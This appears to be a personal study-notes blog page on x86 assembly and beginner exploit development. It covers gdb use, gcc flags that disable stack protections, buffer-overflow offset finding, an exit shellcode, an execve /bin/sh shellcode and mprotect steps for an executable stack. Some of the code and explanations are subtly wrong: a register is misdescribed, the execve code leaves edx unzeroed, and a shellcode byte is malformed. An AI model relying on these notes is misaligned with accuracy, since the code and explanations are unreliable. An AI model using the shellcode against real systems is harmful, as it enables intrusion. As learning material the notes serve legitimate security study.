<!DOCTYPE html>
<html lang="en" data-theme="light"><head>
    <title> Shibin B Shaji | Intro to Assembly Language and Exploit Development </title>
    <meta charset="utf-8"><meta name="generator" content="Hugo 0.118.2"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
    <meta name="description" content="Script kiddie | Full Stack Developer | Designer | Gamer">
    
    <link rel="stylesheet" href="https://shibinbshaji.com/css/style.min.3bc3fa35d9e84b19ef733119c6a0250df66531652a664b5e59e9d5fe0c37142e.css" integrity="sha256-O8P6NdnoSxnvczEZxqAlDfZlMWUqZkteWenV/gw3FC4=" type="text/css">
    
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <base href="https://shibinbshaji.com">
    
    <link rel="shortcut icon" href="https://shibinbshaji.com/favicons/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" sizes="180x180" href="https://shibinbshaji.com/favicons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://shibinbshaji.com/favicons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://shibinbshaji.com/favicons/favicon-16x16.png">
    <link rel="canonical" href="https://shibinbshaji.com/notes/assembly-exploit-dev/">
    
    
    <script type="text/javascript" src="https://shibinbshaji.com/js/anatole-header.min.ed912806a856a21a5e5ded5fc93e811a3266f4cff7026a0897794ada2980d487.js" integrity="sha256-7ZEoBqhWohpeXe1fyT6BGjJm9M/3AmoIl3lK2imA1Ic="></script>


        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">

</head>
<body><style>
   
body { background: black }

.blink {
  position: relative;
  font-family: Monaco, Arial, Helvetica, sans-serif;
  line-height: 24px;
  font-size: 24px;
  color: white;


}

.blink::after {
  content: "";
  position: absolute;
  top: 0;
  right: -15px;
   
  display: inline-block;
  background-color: #606060;
  vertical-align: top;
  width: 10px;
   
  height: 24px;
   
  -webkit-animation: blink 1s step-end infinite;
  animation: blink 1s step-end infinite;
}

@-webkit-keyframes blink {
  0% { opacity: 1.0; }
  50% { opacity: 0.0; }
  100% { opacity: 1.0; }
}

@keyframes blink {
  0% { opacity: 1.0; }
  50% { opacity: 0.0; }
  100% { opacity: 1.0; }
}
  </style>
<div class="sidebar animated fadeInDown">
    <div class="logo-title">
      <div class="title">
        <img src="https://shibinbshaji.com/images/profile.jpg" alt="profile picture">
        <h3 title=""><a href="/">&lt; SHIBIN B SHAJI /&gt;<span class="blink"></span></a></h3>
        <div class="description">
          <p>Script kiddie | Full Stack Developer | Designer | Gamer</p>
        </div>
      </div>
    </div>
    <ul class="social-links">
        
        <li>
        <a href="https://www.linkedin.com/in/shibinbshaji/" rel="me" aria-label="Linkedin">
          <i class="fa fa-2x fa-linkedin" aria-hidden="true"></i>
        </a>
        </li>

        
        <li>
        <a href="https://twitter.com/shibinbshaji06" rel="me" aria-label="Twitter">
          <i class="fa fa-2x fa-twitter" aria-hidden="true"></i>
        </a>
        </li>

        
        <li>
        <a href="https://github.com/shibinbshaji/" rel="me" aria-label="GitHub">
          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
        </a>
        </li>

        
        <li>
        <a href="https://www.instagram.com/shibinbshaji/" rel="me" aria-label="instagram">
          <i class="fa fa-2x fa-instagram" aria-hidden="true"></i>
        </a>
        </li>

        
        <li>
        <a href="mailto:shibinbshaji007@gmail.com" rel="me" aria-label="e-mail">
          <i class="fa fa-2x fa-envelope" aria-hidden="true"></i>
        </a>
        </li>

        
        <li>
        <a href="https://steamcommunity.com/id/shibinzz" rel="me" aria-label="steam">
          <i class="fa fa-2x fa-steam" aria-hidden="true"></i>
        </a>
        </li>

        
    </ul>
    <div class="footer">
        <div class="by_farbox">&copy; Shibin B Shaji 2023 </div>
      </div>
    </div>
</div>
<div class="main">
            <div class="page-top animated fadeInDown">
    <ul class="nav">
      
        
        
        
        <li><a  href="/" title="">&lt;shibin.b.shaji/&gt;</a></li>
        
        
        <li><a  href="/posts/" title="">Posts</a></li>
        
        
        <li><a  href="/notes/" title="">Notes</a></li>
        
    </ul>
    <div class="themeswitcher">
        <a class="theme-switch" title="Switch Theme">
            <i class="fa fa-adjust fa-fw" aria-hidden="false"></i>
        </a>
    </div>
</div>

            <div class="autopagerize_page_element">
                <div class="content">
  <style>
    img{
      display: block;
 margin-left: auto;
 margin-right: auto;
 width: 50%;
    }
    </style>
<div class="post animated fadeInDown">
    <div class="post-content">

      <div class="post-title">
        <h3>Intro to Assembly Language and Exploit Development
        </h3>
        
        </div>

    <h2 id="syntax">Syntax</h2>
<p><code>mov</code></p>
<ul>
<li><code>global _start</code> : <code>global</code> tells the linker that the entry point of our program is <code>_start</code>.</li>
<li><code>_start</code> : start of program</li>
<li><code>mov eax,8</code> : moves 8 to <code>eax</code></li>
<li><code>mov eax,ebx</code> : moves value of <code>ebx</code> to <code>eax</code></li>
<li><code>mov ecx,[esp]</code> : moves the address of <code>esp</code> to <code>ecx</code></li>
</ul>
<hr>
<p><code>add</code> , <code>sub</code>, <code>inc</code> , <code>dec</code></p>
<ul>
<li><code>add eax,230</code></li>
<li><code>sub ebx,2</code></li>
<li><code>inc ebx</code> - increment</li>
<li><code>dec eax</code> - decrement</li>
</ul>
<hr>
<p><code>xor</code>
bitwise <code>xor</code> of each value</p>
<hr>
<p>push,pop</p>
<p><code>push eax</code> : pushes <code>eax</code> into stack
<code>pop ebx</code> : pops value on top of stack and stores into <code>ebx</code></p>
<hr>
<p><code>cmp</code>,<code>jne</code></p>
<p><code>cmp</code> is followed by <code>jne</code> (jump if not equal to). cmp sets value for jne.</p>
<hr>
<p><code>nop</code>
No operation</p>
<hr>
<h2 id="compiling-and-running-using-gdb">Compiling and running using gdb</h2>
<p><strong>Assemble</strong></p>
<p><code>nasm &lt;filename&gt;.nasm -f elf32 -o &lt;out&gt;.o</code></p>
<ul>
<li><code>-f</code> : format type</li>
<li><code>-o</code> : output file</li>
</ul>
<p><strong>Linking</strong></p>
<p>32 bit machine: <code>ld &lt;out&gt;.o -o out</code>
64 bit machine: <code>ld -m elf_i386 -o &lt;file&gt; &lt;file&gt;.o</code></p>
<p><strong>Examine register</strong></p>
<p><code>gdb ./out</code></p>
<p><strong>Compiling C programs</strong></p>
<ul>
<li>32 bit machines: <code>gcc &lt;filename&gt;.c</code></li>
<li>64 bit machines: <code>gcc -m32 &lt;filename&gt;.c</code> (note that you might need to run <code>sudo apt-get install gcc-multilib</code>)</li>
</ul>
<pre tabindex="0"><code>gcc -m32 -fno-stack-protector vulnerable.c -o vulnerable -z execstack -D_FORTIFY_SOURCE=0
</code></pre><p><code>-fno-stack-protector</code>: stack canary protection disables</p>
<p><code>execstack</code>: to allow us to execute in stack</p>
<p>object dump : <code>objdump -d &lt;file&gt; -M intel</code></p>
<hr>
<h2 id="gdb-geff">gdb-geff</h2>
<p><code>break</code> : set a breakpoint.
eg :</p>
<ol>
<li><code>break _start</code></li>
<li><code>break *0x804806a</code></li>
<li><code>b _start</code></li>
</ol>
<p><code>run</code> : to run the program</p>
<p><code>si</code> : run single instruction</p>
<p><code>c</code> : continue</p>
<p><code>innfo breakpoints</code> : info about breakpoints.</p>
<p><code>print $al</code> : prints values of <code>al</code> register.</p>
<p><code>gdb -core &lt;coreFile&gt;</code> will load the core file (kinda like crash log) onto gdb.</p>
<p><code>info registers</code> : shows value of registers</p>
<p><code>disass &lt;func&gt;</code>: disassemble that function.</p>
<p><code>vmmap</code> : display memory map of the program</p>
<hr>
<h2 id="buffer-overflow">Buffer overflow</h2>
<p><strong>NX</strong>
Non Exicutable bit.</p>
<p>$eip contains the next instruction to be executed.</p>
<p>Enter vanilla amounts. see if it overwrites</p>
<p>see at what amount the eip gets over written</p>
<p>then generate a random pattern from &ldquo;<a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html?m=1%22">https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html?m=1&quot;</a></p>
<p>then see which value is in the eip</p>
<p>enter that to find the offset</p>
<hr>
<h2 id="ropper">ropper</h2>
<ul>
<li>
<p>Finding address or gadgets</p>
</li>
<li>
<p>Finds the offset of an instruction. add that to the base address of the file</p>
</li>
</ul>
<p><code>file &lt;file-to-load&gt;</code></p>
<p><code>search /1/ jmp esp</code></p>
<ul>
<li>To find a string address like /bin/sh:
<code>ropper --file &lt;file&gt; --string &lt;string to find&gt;</code></li>
</ul>
<hr>
<h2 id="exit-shellcode">exit shellcode</h2>
<ul>
<li>exit returns a value after exiting the process and that value will be stored in the ebx register</li>
<li>xor eax with eax to remove all the null bytes</li>
<li>obj dump will return something like this:</li>
</ul>
<pre tabindex="0"><code>8048060:	31 c0                	xor    eax,eax
8048062:	31 db                	xor    ebx,ebx
8048064:	b0 01                	mov    al,0x1
8048066:	b3 02                	mov    bl,0x2
8048068:	cd 80                	int    0x80
</code></pre><ul>
<li>In this case the shellcode is obtained by writing the values 31,c0 etc etc together.</li>
</ul>
<p><code>\x31\xc0\x31\xdb\xb0\x01\xb3\x02\xcd\80</code> is the corresponding shellcode.</p>
<ul>
<li>Instead of writing that down manually, we can go for the command:</li>
</ul>
<pre tabindex="0"><code>objdump -d ./file |grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&#34;/&#39;|sed &#39;s/$/&#34;/g&#39;
</code></pre><hr>
<h2 id="execve-shellcode">execve shellcode</h2>
<p>This will be the basic idea of the shellcode</p>
<pre tabindex="0"><code>global _start

_start:

	mov eax,SYSTEMCALL
	mov ebx, /bin/sh
	mov ecx,null
	mov edx,null
	int 0x80
</code></pre><p>To find out the <code>SYSTEMCALL</code>:</p>
<ul>
<li><code>locate unistd_32.h</code></li>
<li><code>cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 'execve'</code></li>
<li>output will be</li>
</ul>
<pre tabindex="0"><code>#define __NR_execve 11
#define __NR_execveat 358
</code></pre><p>here, 11 is the required <code>SYSTEMCALL</code></p>
<ul>
<li>next, ebx should contain <code>/bin/sh/</code> in reverse since it is to be pushed onto the stack.</li>
<li>convert to hex in reverse order (online tools)</li>
<li>the code will look like this now:</li>
</ul>
<pre tabindex="0"><code>global _start

_start:

        xor eax,eax
        mov eax, edx
        mov al, 11
        push edx
        push 0x68732f6e
        push 0x69622f2f
        int 0x80
</code></pre><ul>
<li>now, ebx should contain the value <code>/bin/sh</code>. since we already pushed that value to the stack and esp points to it, move <code>esp</code> to <code>ebx</code>.</li>
<li>set ecx to null</li>
<li>set edx to null</li>
<li>The final code is:</li>
</ul>
<pre tabindex="0"><code>global _start

_start:

        xor eax,eax
        mov eax, edx
        mov al, 11
        push edx
        push 0x68732f6e
        push 0x69622f2f
        mov ebx, esp
        mov ecx, edx
        int 0x80
</code></pre><hr>
<h2 id="return-oriented-programming">Return Oriented Programming</h2>
<p><code>mprotect</code>: set protection on a region of memory. To turn the stack into executable</p>
<ul>
<li>3 arguements. they should be kept in the following regiesters respectively</li>
</ul>
<ol>
<li>address - <strong><code>ebx</code></strong></li>
<li>len of memory where we want to change protection - <strong><code>ecx</code></strong></li>
<li>protection (prot) value (<code>PROT_NONE</code>, <code>PROT_READ</code>,<code>PROT_WRITE</code>,<code>PROT_EXEC</code>) - <strong><code>edx</code></strong></li>
</ol>
<p>Steps:</p>
<ol>
<li>Inside gdb, type <code>vmmap</code> to find make sure that the stack is not executable.</li>
<li><code>disass mprotect</code></li>
<li>copy the address of <code>mprotect</code> and set a breakpoint there.</li>
<li>we have to redirect the program flow through this, so set the value of <code>$eip</code> to this address.</li>
<li><code>si</code> till the function call</li>
<li>update the values of registers <code>eax</code>,<code>ebx</code>,<code>ecx</code>,<code>edx</code>.</li>
<li><code>set $ebx=&lt;base address of stack&gt;</code></li>
<li><code>set $ecx=0x01010101</code></li>
<li><code>set $edx=7</code> (bitwise result of the three prot values mentioned above)</li>
<li><code>si</code> and check <code>vmmap</code>. The stack should become executable.</li>
</ol>
<p>This is the working of the exploit</p>
<hr>

    </div>
    <div class="post-footer">
      <div class="info">
        
        
    <span class="separator"><a class="tag" href="/tags/notes/">notes</a></span>

      </div>
    </div>

    
</div>


                </div>
            </div>
        </div>
</body>



<script type="text/javascript" src="https://shibinbshaji.com/js/jquery.min.e80d7e6008943348b2c88cd12f10e546083ff6a88f06b4afac7151b78886417e.js" integrity="sha256-6A1&#43;YAiUM0iyyIzRLxDlRgg/9qiPBrSvrHFRt4iGQX4="></script>




<script type="text/javascript" src="https://shibinbshaji.com/js/bundle.min.3ebad6bf39b2e7c2f899d3ed9bc97e8c0c1ead7a1b57472e3387321f673b8077.js" integrity="sha256-PrrWvzmy58L4mdPtm8l&#43;jAwerXobV0cuM4cyH2c7gHc="></script>

<script type="text/javascript" src="https://shibinbshaji.com/js/medium-zoom.min.e1c6918cbaa90022a5612f0bd71c7bf3be6d036614c5729cebfe14f7b91fa4bc.js" integrity="sha256-4caRjLqpACKlYS8L1xx7875tA2YUxXKc6/4U97kfpLw="></script>
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-168075703-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>
</html></body>

</html>
